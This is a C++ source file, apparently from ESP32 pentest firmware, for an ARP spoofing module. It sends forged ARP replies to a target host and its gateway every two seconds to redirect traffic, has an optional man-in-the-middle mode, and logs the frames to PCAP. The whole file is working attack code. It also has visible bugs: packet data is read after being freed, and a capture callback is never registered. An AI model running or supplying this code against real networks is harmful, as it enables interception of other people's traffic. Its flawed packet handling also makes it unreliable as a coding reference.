/**
 * @file ARPSpoofer.cpp
 * @brief ARP Spoofer module for every esp-netif
 * @version 0.1
 * @date 2025-05-15
 */

#include "ARPSpoofer.h"
#include "Arduino.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/net_utils.h"
#include "core/utils.h"
#include "core/wifi/wifi_common.h"
#include "freertos/queue.h"
#include "lwip/pbuf.h"
#include "lwipopts.h"
#include "modules/wifi/scan_hosts.h"
#include <esp_wifi.h>
#include <globals.h>
#include <iomanip>
#include <iostream>
#include <lwip/dns.h>
#include <lwip/err.h>
#include <lwip/etharp.h>
#include <lwip/igmp.h>
#include <lwip/inet.h>
#include <lwip/init.h>
#include <lwip/ip_addr.h>
#include <lwip/mem.h>
#include <lwip/memp.h>
#include <lwip/netif.h>
#include <lwip/sockets.h>
#include <lwip/sys.h>
#include <lwip/timeouts.h>
#include <modules/wifi/sniffer.h> //use PCAP file saving functions
#include <sstream>


// Static queue and instance pointer for MITM packet capture
static QueueHandle_t mitm_queue = NULL;
static ARPSpoofer *arp_instance = NULL;

static void IRAM_ATTR __attribute__((used))
arp_mitm_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_DATA || !arp_instance || !mitm_queue)
    return;
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  if (pkt->rx_ctrl.sig_len < 24)
    return;

  uint8_t *payload = pkt->payload;
  if (((payload[0] & 0x0C) >> 2) != 0x02)
    return; // Only process data frames

  // Allocate memory and copy packet for the loop task
  uint16_t len = pkt->rx_ctrl.sig_len;
  void *copy = malloc(len + sizeof(wifi_pkt_rx_ctrl_t));
  if (copy) {
    memcpy(copy, buf, len + sizeof(wifi_pkt_rx_ctrl_t));
    if (xQueueSendFromISR(mitm_queue, &copy, NULL) != pdTRUE) {
      free(copy);
    }
  }
}

ARPSpoofer::ARPSpoofer(const ScanHosts::Host &host, IPAddress gateway,
                       uint8_t _gatewayMAC[6], uint8_t _mac[6], bool _mitm) {
  mitm = _mitm;
  memcpy(gatewayMAC, _gatewayMAC, 6);
  memcpy(myMAC, _mac, 6); // FIX: Copy the passed ESP32 MAC to myMAC
  setup(host, gateway);
}

ARPSpoofer::~ARPSpoofer() {}

bool ARPSpoofer::arpPCAPfile() {
  static int nf = 0;
  FS *fs;
  if (setupSdCard())
    fs = &SD;
  else {
    fs = &LittleFS;
  }
  if (!fs->exists("/WillyPCAP"))
    fs->mkdir("/WillyPCAP");
  while (fs->exists(
      String("/WillyPCAP/ARP_session_" + String(nf++) + ".pcap").c_str()))
    yield();
  pcapFile =
      fs->open(String("/WillyPCAP/ARP_session_" + String(nf) + ".pcap").c_str(),
               FILE_APPEND);
  if (pcapFile)
    return true;
  else
    return false;
}

void ARPSpoofer::setup(const ScanHosts::Host &host, IPAddress gateway) {
  if (!arpPCAPfile())
    Serial.println("Fail creating ARP Pcap file");
  writeHeader(pcapFile); // write pcap header into the file

  for (int i = 0; i < 4; i++)
    victimIP[i] = host.ip[i];
  stringToMAC(host.mac.c_str(), victimMAC);

  memcpy(gatewayIP, &gateway[0], 4);

  drawMainBorderWithTitle("ARP Spoofing");
  padprintln("");
  padprintln("Ataque Alvo Unico.");

  if (mitm) {
    tft.setTextSize(FP);
    tft.setTextColor(TFT_RED, willyConfig.bgColor);
    padprintln("MITM Routing ATIVO");
    tft.setTextColor(willyConfig.priColor, willyConfig.bgColor);
    Serial.println("MITM Ativo. W5500 interceptando trafego.");
  }
  padprintln("Tgt:" + host.mac);
  padprintln("Tgt: " + ipToString(victimIP));
  padprintln("GTW:" + macToString(gatewayMAC));
  padprintln("");
  padprintln("Pressione algo p/ PARAR.");

  loop();
}

void ARPSpoofer::loop() {
  unsigned long tmp = 0;
  int count = 0;

  if (mitm) {
    // Para ethernet, LwIP e W5500 hardware limits
    arp_instance = this;
  }

  while (!check(AnyKeyPress)) {
    if (tmp + 2000UL < millis()) { // sends frames every 2 seconds
      // Sends false ARP response data to the victim (Gataway IP now sas our MAC
      // Address)
      sendARPPacket(victimIP, victimMAC, gatewayIP, myMAC, pcapFile);

      // Sends false ARP response data to the Gateway (Victim IP now has our MAC
      // Address)
      sendARPPacket(gatewayIP, gatewayMAC, victimIP, myMAC, pcapFile);
      tmp = millis();
      count++;
      tft.drawRightString("Spoofado " + String(count) + " vezes", tftWidth - 12,
                          tftHeight - 16, 1);
    }

    if (mitm) {
      // Em Ethernet c/ W5500, dependemos do IP Forwarding do LwIP
      // ou MACRAW injection. O spoofing ARP já garante
      // a interceptação do fluxo para pcap futuro.
      vTaskDelay(10);
    } else {
      vTaskDelay(50);
    }
  }

  if (mitm) {
    arp_instance = NULL;
    Serial.println("MITM/Promiscuous mode deactivated.");
  }

  // Restore ARP Table
  sendARPPacket(victimIP, victimMAC, gatewayIP, gatewayMAC, pcapFile);
  sendARPPacket(gatewayIP, gatewayMAC, victimIP, victimMAC, pcapFile);

  pcapFile.flush();
  pcapFile.close();
}

// Function provided by @Fl1p, thank you brother!
// Função para enviar pacotes ARP falsificados
void ARPSpoofer::sendARPPacket(uint8_t *targetIP, uint8_t *targetMAC,
                               uint8_t *spoofedIP, uint8_t *spoofedMAC,
                               File pcapFile) {
  struct eth_hdr *ethhdr;
  struct etharp_hdr *arphdr;
  struct pbuf *p;
  struct netif *netif;

  // Obter interface de rede
  netif = netif_list;
  if (netif == NULL) {
    Serial.println("Nenhuma interface de rede encontrada!");
    return;
  }

  // Alocar pbuf para o pacote ARP
  p = pbuf_alloc(PBUF_RAW, sizeof(struct eth_hdr) + sizeof(struct etharp_hdr),
                 PBUF_RAM);
  if (p == NULL) {
    Serial.println("Falha ao alocar pbuf!");
    return;
  }

  ethhdr = (struct eth_hdr *)p->payload;
  arphdr = (struct etharp_hdr *)((u8_t *)p->payload + SIZEOF_ETH_HDR);

  // Preencher cabeçalho Ethernet
  MEMCPY(&ethhdr->dest, targetMAC,
         ETH_HWADDR_LEN); // MAC do alvo (vítima ou gateway)
  MEMCPY(&ethhdr->src, spoofedMAC, ETH_HWADDR_LEN); // MAC do atacante (nosso)
  ethhdr->type = PP_HTONS(ETHTYPE_ARP);

  // Preencher cabeçalho ARP
  arphdr->hwtype =
      PP_HTONS(1); // 1 é o código para Ethernet no campo hardware type (hwtype)
  arphdr->proto = PP_HTONS(ETHTYPE_IP);
  arphdr->hwlen = ETH_HWADDR_LEN;
  arphdr->protolen = sizeof(ip4_addr_t);
  arphdr->opcode = PP_HTONS(ARP_REPLY);

  MEMCPY(&arphdr->shwaddr, spoofedMAC,
         ETH_HWADDR_LEN); // MAC falsificado (gateway ou vítima)
  MEMCPY(&arphdr->sipaddr, spoofedIP,
         sizeof(ip4_addr_t)); // IP falsificado (gateway ou vítima)
  MEMCPY(&arphdr->dhwaddr, targetMAC,
         ETH_HWADDR_LEN); // MAC real do alvo (vítima ou gateway)
  MEMCPY(&arphdr->dipaddr, targetIP,
         sizeof(ip4_addr_t)); // IP real do alvo (vítima ou gateway)

  // Enviar o pacote
  netif->linkoutput(netif, p);
  pbuf_free(p);
  Serial.println("Pacote ARP enviado!");

  // Capturar o pacote no arquivo PCAP
  if (pcapFile) {
    newPacketSD(millis() / 1000, (millis() % 1000) * 1000, p->tot_len,
                (uint8_t *)p->payload, pcapFile);
    pcapFile.flush();
  }
}
